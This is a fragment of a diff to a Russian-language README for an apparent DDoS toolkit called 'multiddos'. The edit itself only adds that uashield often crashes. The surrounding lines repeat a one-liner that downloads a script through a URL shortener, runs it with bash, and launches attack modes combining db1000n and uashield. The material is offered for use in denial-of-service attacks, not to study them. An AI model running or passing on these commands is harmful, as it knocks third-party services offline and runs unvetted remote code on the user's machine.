@@ -38,7 +38,7 @@ curl -L tiny.one/multiddos -o mul.ti && bash mul.ti -m1 && tmux a
 ```
 curl -L tiny.one/multiddos -o mul.ti && bash mul.ti -m2 && tmux a
 ```
-* `-m3` запускает Multiddos + db1000n + uashield (на данный момент не рекомендуется, так как эффективность uashield не ясна, и он дублирует атаки по тем же целям, что и утилиты выше)
+* `-m3` запускает Multiddos + db1000n + uashield (на данный момент не рекомендуется, так как эффективность uashield не ясна, он дублирует атаки по тем же целям, что и утилиты выше, и часто вылетает)
 
 ```
 curl -L tiny.one/multiddos -o mul.ti && bash mul.ti -m3 && tmux a
